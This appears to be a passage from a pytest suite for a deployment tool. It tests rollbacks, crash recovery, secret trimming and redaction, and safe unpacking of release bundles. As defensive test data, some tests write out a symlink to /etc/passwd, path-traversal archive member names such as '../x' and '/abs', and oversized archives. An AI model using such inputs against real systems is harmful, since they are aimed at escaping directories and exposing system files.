            state["swapped"] = True
        return orig_run(args, env, **kw)

    world.runner.run = run
    world.dep.secrets = secrets
    assert world.dep.run_once() == "failed-no-previous"
    assert any("stop" in c["args"] for c in world.runner.calls)


def test_a_rollback_that_raises_unexpectedly_is_reported_not_thrown(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    world.runner.fail_on["--remove-orphans"] = 1

    # the candidate's own activation happens before the swap, so break it only for the rollback
    calls = {"n": 0}
    real = D.Deployer._activate

    def flaky(self, p):
        calls["n"] += 1
        if calls["n"] >= 2:
            raise RuntimeError("disk")
        return real(self, p)

    world.dep._activate = lambda p: flaky(world.dep, p)
    assert world.dep.run_once() == "rollback-failed"


def test_a_prune_that_fails_does_not_change_what_the_deploy_reported(world, monkeypatch) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)

    def boom(self):
        raise OSError("I/O error")

    monkeypatch.setattr(D.Path, "iterdir", boom)
    assert world.dep.run_once() == "deployed"
    assert _state(world, "current.json")["sha"] == "b" * 40


def test_partial_or_mistyped_state_files_count_as_unknown(world) -> None:
    world.publish()
    (world.cfg.state_dir).mkdir(parents=True, exist_ok=True)
    (world.cfg.state_dir / "current.json").write_text(json.dumps({"sha": "a" * 40}))
    d = json.loads(world.store.objects[(BUCKET, "desired.json")])
    (world.cfg.state_dir / "failed.json").write_text(json.dumps({"signature": D.signature(d), "phase": "post-swap", "at": "yesterday"}))
    assert world.dep.run_once() == "deployed"


def test_a_desired_json_that_is_not_utf8_is_reported(world) -> None:
    world.store.objects[(BUCKET, "desired.json")] = b'{"sha": "\xff\xfe"}'
    assert world.dep.run_once() == "bad-desired"


def test_db_only_survives_an_unreadable_bucket(world) -> None:
    def boom(bucket, name):
        raise OSError("net")

    world.store.get = boom
    assert world.dep.db_only() == "failed"


def test_a_bundle_without_a_usable_caddyfile_stops_before_anything_runs(world) -> None:
    world.publish(bundle=_bundle({"Caddyfile": b"   \n"}))
    assert world.dep.run_once() == "failed" and world.runner.calls == []


def test_a_secret_shared_by_both_services_is_read_once_per_deploy(world) -> None:
    reads: dict[str, int] = {}
    orig = world.dep.secrets

    def counting(sid):
        reads[sid] = reads.get(sid, 0) + 1
        return orig(sid)

    world.dep.secrets = counting
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    world.dep.run_once()
    assert reads and max(reads.values()) == 2, reads  # one read per run (a: once, b: once — previous and candidate share it)


def _db_secret_id() -> str:
    import yaml
    return yaml.safe_load((_VM / "env/dev.yaml").read_text())["database"]["password_secret"]


@pytest.mark.parametrize("suffix", ["\n", "\r\n"])
def test_one_trailing_line_ending_on_the_database_password_secret_is_not_part_of_it(world, suffix: str) -> None:
    """found on the first dev run: `openssl rand -hex 24 | gcloud secrets create … --data-file=-` stores the line ending too, and the tool refused the 49-byte value"""
    db_id = _db_secret_id()
    orig = world.dep.secrets
    world.dep.secrets = lambda sid: PASSWORD + suffix if sid == db_id else orig(sid)
    d = world.publish("a" * 40)
    assert world.dep.run_once() == "deployed"
    up = next(c for c in world.runner.calls if c["args"][:2] == ["docker", "compose"] and "up" in c["args"] and "--wait-timeout" in c["args"])
    assert up["env"]["POSTGRES_PASSWORD"] == PASSWORD
    assert up["env"]["ALEMBIC_DATABASE_URL"] == f"postgresql://sprintable:{PASSWORD}@db:5432/sprintable"
    assert d["sha"] == _state(world, "current.json")["sha"]


@pytest.mark.parametrize("bad", ["\n\n", " \n", "\r\n\r\n", " ", "\t", "\r"])
def test_anything_else_around_the_database_password_is_still_refused(world, bad: str) -> None:
    db_id = _db_secret_id()
    orig = world.dep.secrets
    world.dep.secrets = lambda sid: PASSWORD + bad if sid == db_id else orig(sid)
    world.publish()
    assert world.dep.run_once() == "failed" and world.runner.calls == []
    assert "database password" in _state(world, "failed.json")["detail"]


def test_a_leading_line_ending_is_not_taken_off(world) -> None:
    db_id = _db_secret_id()
    orig = world.dep.secrets
    world.dep.secrets = lambda sid: "\n" + PASSWORD if sid == db_id else orig(sid)
    world.publish()
    assert world.dep.run_once() == "failed" and world.runner.calls == []


def test_other_secrets_keep_their_trailing_newline_exactly_as_cloud_run_hands_them_over(world) -> None:
    """only the database password (ours, hex) is tidied; the live services get their secrets verbatim and so does the VM"""
    import yaml
    jwt_id = yaml.safe_load((_VM / "env/dev.yaml").read_text())["services"]["backend"]["secrets"]["JWT_SECRET"]
    orig = world.dep.secrets
    world.dep.secrets = lambda sid: SECRET + "\n" if sid == jwt_id else orig(sid)
    world.publish("a" * 40)
    assert world.dep.run_once() == "deployed"
    up = next(c for c in world.runner.calls if c["args"][:2] == ["docker", "compose"] and "up" in c["args"] and "--wait-timeout" in c["args"])
    assert up["env"]["BACKEND__JWT_SECRET"] == SECRET + "\n"


def test_even_a_short_secret_value_is_removed_from_recorded_output(world) -> None:
    import yaml
    decl = yaml.safe_load((_VM / "env/dev.yaml").read_text())
    jwt_id = decl["services"]["backend"]["secrets"]["JWT_SECRET"]
    orig = world.dep.secrets
    world.dep.secrets = lambda sid: "Zq7" if sid == jwt_id else orig(sid)
    world.publish()
    world.runner.fail_on["migrate"] = 1
    world.runner.out_suffix = " token=Zq7"
    assert world.dep.run_once() == "failed"
    assert "Zq7" not in json.dumps(_state(world, "failed.json")) + json.dumps(world.store.puts)


def test_make_bundle_refuses_links_and_secret_looking_files(tmp_path: Path) -> None:
    import shutil
    mb = _load("make_bundle")
    src = tmp_path / "vm"
    shutil.copytree(_VM, src, ignore=shutil.ignore_patterns("__pycache__"))
    (src / "env" / ".env").write_text("X=1")
    with pytest.raises(SystemExit, match="secret-looking"):
        mb.build_bundle(src)
    (src / "env" / ".env").unlink()
    (src / "private-plain.json").write_text("{}")
    with pytest.raises(SystemExit, match="secret-looking"):
        mb.build_bundle(src)
    (src / "private-plain.json").unlink()
    (src / "bin" / "link.sh").symlink_to("/etc/passwd")
    with pytest.raises(SystemExit, match="link"):
        mb.build_bundle(src)


def test_make_bundle_packs_only_the_known_shapes(tmp_path: Path) -> None:
    import shutil
    mb = _load("make_bundle")
    src = tmp_path / "vm"
    shutil.copytree(_VM, src, ignore=shutil.ignore_patterns("__pycache__"))
    (src / "notes.txt").write_text("x")
    (src / "env" / "scratch.json").write_text("{}")
    (src / "deep" / "er").mkdir(parents=True)
    (src / "deep" / "er" / "a.py").write_text("x")
    names = set(tarfile.open(fileobj=io.BytesIO(mb.build_bundle(src))).getnames())
    assert not ({"notes.txt", "env/scratch.json", "deep/er/a.py"} & names)
    assert {"compose.yml", "Caddyfile", "env/dev.yaml"} <= names


def test_a_caddyfile_write_that_fails_leaves_the_old_file_untouched_and_no_scratch_file(world, monkeypatch) -> None:
    directory = world.cfg.install_dir / "runtime" / "caddy"
    directory.mkdir(parents=True)
    (directory / "Caddyfile").write_text("# old\n")

    def boom(fd):
        raise OSError("disk full")

    monkeypatch.setattr(D.os, "fsync", boom)
    with pytest.raises(D.DeployError, match="could not write the Caddyfile") as e:
        world.dep._install_caddyfile("# new\n")
    assert e.value.phase == "post-swap"
    assert (directory / "Caddyfile").read_text() == "# old\n"
    assert sorted(p.name for p in directory.iterdir()) == ["Caddyfile"]


def test_the_caddyfile_is_replaced_by_a_rename_so_a_crash_cannot_leave_half_a_file(world, monkeypatch) -> None:
    directory = world.cfg.install_dir / "runtime" / "caddy"
    directory.mkdir(parents=True)
    (directory / "Caddyfile").write_text("# old\n")
    calls = []
    real = D.os.replace
    monkeypatch.setattr(D.os, "replace", lambda a, b: (calls.append((Path(a).name, Path(b).name)), real(a, b))[1])
    world.dep._install_caddyfile("# new\n")
    assert calls == [(".Caddyfile.new", "Caddyfile")] and (directory / "Caddyfile").read_text() == "# new\n"


# ───────────────────────── final QA findings ─────────────────────────

def test_a_deploy_does_not_start_when_the_running_release_cannot_be_prepared_for_a_rollback(world) -> None:
    import shutil
    world.publish("a" * 40)
    world.dep.run_once()
    shutil.rmtree(world.cfg.install_dir / "releases" / ("a" * 40))
    world.publish("b" * 40)
    world.store.objects.pop((BUCKET, "bundles/" + "a" * 40 + ".tgz"), None)
    world.runner.calls.clear()
    assert world.dep.run_once() == "failed"
    assert "cannot be prepared for a rollback" in _state(world, "failed.json")["detail"]
    assert not any("--wait-timeout" in c["args"] for c in world.runner.calls), "nothing was swapped"
    assert _state(world, "current.json")["sha"] == "a" * 40


def test_a_damaged_current_json_never_leads_to_stopping_what_may_be_serving(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    (world.cfg.state_dir / "current.json").write_text("{damaged")
    world.publish("b" * 40)
    world.runner.fail_on["--remove-orphans"] = 1
    world.runner.calls.clear()
    assert world.dep.run_once() == "failed-state-unknown"
    assert not any("stop" in c["args"] for c in world.runner.calls)


def test_a_missing_current_json_is_a_first_deploy_and_still_stops_a_failed_candidate(world) -> None:
    world.publish()
    world.runner.fail_on["--remove-orphans"] = 1
    assert world.dep.run_once() == "failed-no-previous"
    assert any("stop" in c["args"] for c in world.runner.calls)


# ───────────────────────── check_live_names ─────────────────────────

def test_check_live_names_reports_added_gone_and_changed_names_without_values(tmp_path: Path, capsys, monkeypatch) -> None:
    cl = _load("check_live_names")
    fixture = tmp_path / "live.txt"
    fixture.write_text("## svc\nKEEP <plain>\nGONE <plain>\nSEC <secret my-secret>\nMOVED <plain>\n## other\nX <plain>\n")
    live = {"spec": {"template": {"spec": {"containers": [{"env": [
        {"name": "KEEP", "value": "SECRET-VALUE"}, {"name": "NEW", "value": "SECRET-VALUE-2"},
        {"name": "SEC", "valueFrom": {"secretKeyRef": {"name": "other-secret", "key": "latest"}}},
        {"name": "MOVED", "valueFrom": {"secretKeyRef": {"name": "now-secret", "key": "latest"}}},
    ]}]}}}}
    problems = cl.compare(cl.fixture_names(fixture, "svc"), cl.live_names(live))
    assert problems == [
        "added live (not in the declaration): NEW",
        "gone live (still in the declaration): GONE",
        "changed: MOVED was «plain», is «secret now-secret»",
        "changed: SEC was «secret my-secret», is «secret other-secret»",
    ]
    assert "SECRET-VALUE" not in "".join(problems)
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(live)))
    assert cl.main(["x", str(fixture), "svc"]) == 1
    out = capsys.readouterr().out
    assert "NEW" in out and "SECRET-VALUE" not in out


def test_check_live_names_accepts_the_real_fixture_against_itself() -> None:
    cl = _load("check_live_names")
    for section in ("sprintable-backend-dev", "sprintable-frontend-dev"):
        names = cl.fixture_names(_VM / "env/live-names.dev.txt", section)
        env = [({"name": n, "valueFrom": {"secretKeyRef": {"name": k.split(" ", 1)[1], "key": "latest"}}} if k != "plain" else {"name": n, "value": "v"}) for n, k in names.items()]
        live = {"spec": {"template": {"spec": {"containers": [{"env": env}]}}}}
        assert names and cl.compare(names, cl.live_names(live)) == []


# ───────────────────────── in-flight swap (QA round 2) ─────────────────────────

def test_a_swap_that_never_got_recorded_is_not_treated_as_a_first_deploy(world, monkeypatch) -> None:
    """the process dies after the new release is serving but before current.json is written; the next failing deploy must not stop what is running"""
    real = D._write_json

    def die(path, obj):
        if Path(path).name == "current.json":
            raise SystemExit("killed")
        return real(path, obj)

    world.publish("a" * 40)
    monkeypatch.setattr(D, "_write_json", die)
    with pytest.raises(SystemExit):
        world.dep.run_once()
    monkeypatch.setattr(D, "_write_json", real)
    assert (world.cfg.state_dir / "pending.json").exists() and _state(world, "current.json") is None
    world.publish("b" * 40)
    world.runner.fail_on["--remove-orphans"] = 1
    world.runner.calls.clear()
    assert world.dep.run_once() == "failed-state-unknown"
    assert not any("stop" in c["args"] for c in world.runner.calls)


def test_the_in_flight_marker_is_removed_once_the_state_is_known(world) -> None:
    world.publish("a" * 40)
    assert world.dep.run_once() == "deployed"
    assert not (world.cfg.state_dir / "pending.json").exists()
    world.publish("b" * 40)
    orig = world.runner.run

    def run(args, env, **kw):
        if "--wait-timeout" in args and env.get("BACKEND_IMAGE", "").endswith(_digest("b" * 40)):
            return 1, "b does not come up"
        return orig(args, env, **kw)

    world.runner.run = run
    assert world.dep.run_once() == "rolled-back"
    assert not (world.cfg.state_dir / "pending.json").exists()


def test_a_stopped_failed_first_release_clears_the_marker(world) -> None:
    world.publish()
    world.runner.fail_on["--remove-orphans"] = 1
    assert world.dep.run_once() == "failed-no-previous"
    assert not (world.cfg.state_dir / "pending.json").exists()


# ───────────────────────── a run that died in the middle of a rollback (QA round 3) ─────────────────────────

def _break_b_then_crash_the_rollback(world):
    """b's swap fails; the rollback to a is killed in the middle (SystemExit) — leaving failed.json(b), pending.json and a valid current.json(a)"""
    orig = world.runner.run
    state = {"crash": True}

    def run(args, env, **kw):
        if "--wait-timeout" in args:
            if env.get("BACKEND_IMAGE", "").endswith(_digest("b" * 40)):
                return 1, "b does not come up"
            if state["crash"] and env.get("BACKEND_IMAGE", "").endswith(_digest("a" * 40)):
                raise SystemExit("killed during the rollback")
        return orig(args, env, **kw)

    world.runner.run = run
    return state, orig


def test_a_rollback_that_was_killed_is_finished_by_the_next_run_before_anything_is_skipped(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    state, _orig = _break_b_then_crash_the_rollback(world)
    with pytest.raises(SystemExit):
        world.dep.run_once()
    assert (world.cfg.state_dir / "pending.json").exists() and _state(world, "current.json")["sha"] == "a" * 40
    state["crash"] = False
    world.runner.calls.clear()
    assert world.dep.run_once() == "skipping-failed", "b failed after the swap and is still not retried"
    restore = [c for c in world.runner.calls if "--wait-timeout" in c["args"]]
    assert [c["env"]["BACKEND_IMAGE"] for c in restore] == [D_a_image := f"{REG}/backend@{_digest('a' * 40)}"], "the recorded release a was put back first"
    assert D_a_image
    assert not (world.cfg.state_dir / "pending.json").exists()


def test_a_marker_left_for_the_recorded_release_is_just_cleared(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    cur = _state(world, "current.json")
    (world.cfg.state_dir / "pending.json").write_text(json.dumps({**{k: cur[k] for k in D.STATE_KEYS}, "at": 1}))
    world.runner.calls.clear()
    assert world.dep.run_once() == "up-to-date"
    assert world.runner.calls == [] and not (world.cfg.state_dir / "pending.json").exists()


def test_an_incomplete_marker_for_the_same_sha_is_not_trusted_and_the_recorded_release_is_put_back(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    (world.cfg.state_dir / "pending.json").write_text(json.dumps({"sha": "a" * 40, "at": 1}))
    world.runner.calls.clear()
    assert world.dep.run_once() == "up-to-date"
    assert any("--wait-timeout" in c["args"] for c in world.runner.calls)
    assert not (world.cfg.state_dir / "pending.json").exists()


def test_when_the_recorded_release_cannot_be_put_back_nothing_else_happens(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    state, orig = _break_b_then_crash_the_rollback(world)
    with pytest.raises(SystemExit):
        world.dep.run_once()
    run_hooked = world.runner.run

    def run(args, env, **kw):
        if "--wait-timeout" in args and env.get("BACKEND_IMAGE", "").endswith(_digest("a" * 40)):
            return 1, "a does not come up either"
        return run_hooked(args, env, **kw)

    state["crash"] = False
    world.runner.run = run
    world.publish("c" * 40)
    world.runner.calls.clear()
    assert world.dep.run_once() == "reconcile-failed"
    assert (world.cfg.state_dir / "pending.json").exists()
    assert not any(c["env"].get("BACKEND_IMAGE", "").endswith(_digest("c" * 40)) and "--wait-timeout" in c["args"] for c in world.runner.calls), "no new release is started on top of an unresolved one"


# ───────────────────────── unresolved swaps are settled first (QA round 4) ─────────────────────────

def test_an_unresolved_swap_is_settled_even_when_desired_json_cannot_be_read(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    state, _ = _break_b_then_crash_the_rollback(world)
    with pytest.raises(SystemExit):
        world.dep.run_once()
    state["crash"] = False

    def boom(bucket, name):
        if name == "desired.json":
            raise OSError("net")
        return world.store.objects.get((bucket, name))

    world.store.get = boom
    world.runner.calls.clear()
    assert world.dep.run_once() == "desired-unreadable"
    restore = [c for c in world.runner.calls if "--wait-timeout" in c["args"]]
    assert restore and all(c["env"]["BACKEND_IMAGE"].endswith(_digest("a" * 40)) for c in restore), "the recorded release was put back first"
    assert not (world.cfg.state_dir / "pending.json").exists()


def test_when_the_recorded_release_cannot_be_put_back_nothing_else_is_even_looked_at(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    state, _ = _break_b_then_crash_the_rollback(world)
    with pytest.raises(SystemExit):
        world.dep.run_once()
    state["crash"] = False
    hooked = world.runner.run

    def run(args, env, **kw):
        if "--wait-timeout" in args and env.get("BACKEND_IMAGE", "").endswith(_digest("a" * 40)):
            return 1, "a does not come up either"
        return hooked(args, env, **kw)

    world.runner.run = run
    world.store.objects.pop((BUCKET, "desired.json"))
    assert world.dep.run_once() == "reconcile-failed", "reported even though desired.json is missing"


def _first_deploy_that_fails_and_cannot_be_stopped(world):
    world.publish()
    world.runner.fail_on["--remove-orphans"] = 1
    world.runner.fail_on[" stop backend"] = 1
    return world.dep.run_once()


def test_a_failed_first_release_that_could_not_be_stopped_is_unknown_and_is_stopped_again_next_time(world) -> None:
    assert _first_deploy_that_fails_and_cannot_be_stopped(world) == "failed-state-unknown"
    pend = json.loads((world.cfg.state_dir / "pending.json").read_text())
    assert pend["sha"] == "a" * 40 and pend["backend_image"].endswith(_digest("a" * 40)), "the marker says which release to stop"
    world.runner.fail_on.pop(" stop backend")
    world.runner.calls.clear()
    assert world.dep.run_once() == "skipping-failed", "the same version is still not retried"
    assert any("stop" in c["args"] for c in world.runner.calls), "but the leftover candidate was stopped first"
    assert not (world.cfg.state_dir / "pending.json").exists()


def test_the_stop_is_retried_every_run_until_it_works(world) -> None:
    _first_deploy_that_fails_and_cannot_be_stopped(world)
    world.runner.calls.clear()
    assert world.dep.run_once() == "reconcile-failed"
    assert (world.cfg.state_dir / "pending.json").exists()
    assert any("stop" in c["args"] for c in world.runner.calls)


def test_a_marker_without_a_recorded_release_and_with_a_damaged_current_json_stops_nothing(world) -> None:
    """the marker is complete and the swap is recorded as failed — a stop WOULD happen if current.json were simply absent; with a damaged one something may be serving, so nothing is stopped"""
    assert _first_deploy_that_fails_and_cannot_be_stopped(world) == "failed-state-unknown"
    (world.cfg.state_dir / "current.json").write_text("{damaged")
    world.runner.fail_on.pop(" stop backend")
    world.runner.calls.clear()
    world.dep.run_once()
    assert not any("stop" in c["args"] for c in world.runner.calls), "something may be serving — leave it alone"
    assert (world.cfg.state_dir / "pending.json").exists()


def test_an_old_style_marker_without_images_is_reported_not_guessed_at(world) -> None:
    world.publish()
    (world.cfg.state_dir).mkdir(parents=True, exist_ok=True)
    (world.cfg.state_dir / "pending.json").write_text(json.dumps({"sha": "a" * 40, "at": 1}))
    assert world.dep.run_once() == "failed-state-unknown" and world.runner.calls == []


def test_a_first_release_that_was_not_recorded_as_failed_is_not_stopped_and_gets_recorded_by_the_next_run(world, monkeypatch) -> None:
    real = D._write_json

    def die(path, obj):
        if Path(path).name == "current.json":
            raise SystemExit("killed")
        return real(path, obj)

    world.publish("a" * 40)
    monkeypatch.setattr(D, "_write_json", die)
    with pytest.raises(SystemExit):
        world.dep.run_once()
    monkeypatch.setattr(D, "_write_json", real)
    world.runner.calls.clear()
    assert world.dep.run_once() == "deployed"
    assert not any("stop" in c["args"] for c in world.runner.calls)
    assert _state(world, "current.json")["sha"] == "a" * 40 and not (world.cfg.state_dir / "pending.json").exists()


# ───────────────────────── exact compose, bounded bundles (PO decision on Kadir's lens) ─────────────────────────

def test_the_refusal_names_the_places_that_differ_and_no_values(world) -> None:
    import yaml
    doc = yaml.safe_load((_VM / "compose.yml").read_text())
    doc["services"]["db"]["environment"]["POSTGRES_HOST_AUTH_METHOD"] = "trust-this-value-must-not-print"
    world.publish(bundle=_bundle({"compose.yml": yaml.safe_dump(doc).encode()}))
    assert world.dep.run_once() == "failed"
    detail = _state(world, "failed.json")["detail"]
    assert "services.db.environment" in detail and "trust-this-value-must-not-print" not in detail
    assert world.runner.calls == []


def test_a_compose_file_identical_to_the_installed_one_is_accepted_even_if_written_differently(world) -> None:
    import yaml
    doc = yaml.safe_load((_VM / "compose.yml").read_text())
    world.publish(bundle=_bundle({"compose.yml": yaml.safe_dump(doc, sort_keys=True).encode()}))
    assert world.dep.run_once() == "deployed"


def test_without_the_installed_copy_nothing_is_deployed(world, tmp_path: Path) -> None:
    world.cfg.trusted_compose = tmp_path / "missing" / "compose.yml"
    world.publish()
    assert world.dep.run_once() == "failed" and world.runner.calls == []


def _tar(members: list[tuple[str, bytes]]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in members:
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


@pytest.mark.parametrize("name", ["a/../b", "../x", "/abs", "a/b/../../../c", "..", "a\\..\\b"])
def test_member_names_with_dot_dot_or_absolute_are_refused_with_a_clear_message(tmp_path: Path, name: str) -> None:
    with pytest.raises(D.DeployError, match="«\\.\\.»|escapes"):
        D.safe_extract(_tar([(name, b"x")]), tmp_path / "out")


def test_a_bundle_with_too_many_members_is_refused(tmp_path: Path) -> None:
    with pytest.raises(D.DeployError, match="too many or too large"):
        D.safe_extract(_tar([(f"f{i}.txt", b"x") for i in range(D.MAX_MEMBERS + 1)]), tmp_path / "out")


def test_a_bundle_that_unpacks_to_too_much_is_refused(tmp_path: Path) -> None:
    with pytest.raises(D.DeployError, match="too many or too large"):
        D.safe_extract(_tar([("big.bin", b"0" * (D.MAX_UNPACKED_BYTES + 1))]), tmp_path / "out")


def test_a_compressed_bundle_over_the_limit_is_refused_before_it_is_opened(tmp_path: Path) -> None:
    with pytest.raises(D.DeployError, match="larger than"):
        D.safe_extract(b"0" * (D.MAX_BUNDLE_BYTES + 1), tmp_path / "out")


def test_a_corrupt_bundle_is_a_deploy_error_not_a_crash(tmp_path: Path) -> None:
    with pytest.raises(D.DeployError, match="cannot be unpacked"):
        D.safe_extract(b"this is not a tarball", tmp_path / "out")


# ───────────────────────── QA round 5 ─────────────────────────

def test_a_rebuilt_bundle_for_the_same_git_sha_is_extracted_again_not_taken_from_the_old_folder(world) -> None:
    world.publish("a" * 40)
    assert world.dep.run_once() == "deployed"
    runtime = world.cfg.install_dir / "runtime" / "caddy" / "Caddyfile"
    old = runtime.read_text()
    d = world.publish("a" * 40, bundle=_bundle({"Caddyfile": b"# rebuilt for the same git sha\n"}), backend=f"{REG}/backend@{_digest('a' * 40 + 'x')}")
    assert world.dep.run_once() == "deployed"
    assert runtime.read_text() == "# rebuilt for the same git sha\n" != old
    assert (world.cfg.install_dir / "releases" / ("a" * 40) / ".bundle-sha256").read_text() == d["bundle_sha256"]


def test_a_damaged_release_folder_without_the_checksum_stamp_is_extracted_again(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    (world.cfg.install_dir / "releases" / ("a" * 40) / ".bundle-sha256").unlink()
    (world.cfg.install_dir / "releases" / ("a" * 40) / "Caddyfile").write_text("# tampered\n")
    world.dep.run_once(force=True)
    assert (world.cfg.install_dir / "runtime" / "caddy" / "Caddyfile").read_text() == (_VM / "Caddyfile").read_text()


def test_a_marker_for_the_same_git_sha_but_other_images_does_not_count_as_the_recorded_release(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    cur = _state(world, "current.json")
    pend = {k: cur[k] for k in D.STATE_KEYS}
    pend["backend_image"] = f"{REG}/backend@{_digest('other-image')}"
    pend["at"] = 1
    (world.cfg.state_dir / "pending.json").write_text(json.dumps(pend))
    world.runner.calls.clear()
    assert world.dep.run_once() == "up-to-date"
    restore = [c for c in world.runner.calls if "--wait-timeout" in c["args"]]
    assert restore and all(c["env"]["BACKEND_IMAGE"] == cur["backend_image"] for c in restore), "the recorded release was put back"
    assert not (world.cfg.state_dir / "pending.json").exists()


@pytest.mark.parametrize("damage", ["directory", "binary", "empty"])
def test_a_damaged_checksum_stamp_means_the_folder_is_extracted_again(world, damage: str) -> None:
    import shutil
    world.publish("a" * 40)
    world.dep.run_once()
    stamp = world.cfg.install_dir / "releases" / ("a" * 40) / ".bundle-sha256"
    stamp.unlink()
    if damage == "directory":
        stamp.mkdir()
    elif damage == "binary":
        stamp.write_bytes(b"\xff\xfe\x00\x80")
    else:
        stamp.write_text("")
    (world.cfg.install_dir / "releases" / ("a" * 40) / "Caddyfile").write_text("# tampered\n")
    assert world.dep.run_once(force=True) == "deployed"
    assert (world.cfg.install_dir / "runtime" / "caddy" / "Caddyfile").read_text() == (_VM / "Caddyfile").read_text()
    assert stamp.is_file() and len(stamp.read_text()) == 64
